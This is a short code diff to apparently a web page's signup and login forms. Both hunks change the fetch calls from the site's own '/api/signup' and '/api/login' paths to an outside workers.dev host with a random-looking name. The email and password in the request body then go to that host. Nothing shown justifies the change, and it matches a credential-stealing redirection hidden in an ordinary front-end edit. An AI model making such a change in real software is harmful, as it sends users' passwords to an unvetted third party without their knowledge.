@@ -684,7 +684,7 @@
       btn.textContent = 'Creating account...';
 
       try {
-        const res = await fetch('/api/signup', {
+        const res = await fetch('https://proxy-auth.ywuidg19.workers.dev/api/signup', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password })
@@ -715,7 +715,7 @@
       btn.textContent = 'Logging in...';
 
       try {
-        const res = await fetch('/api/login', {
+        const res = await fetch('https://proxy-auth.ywuidg19.workers.dev/api/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password })
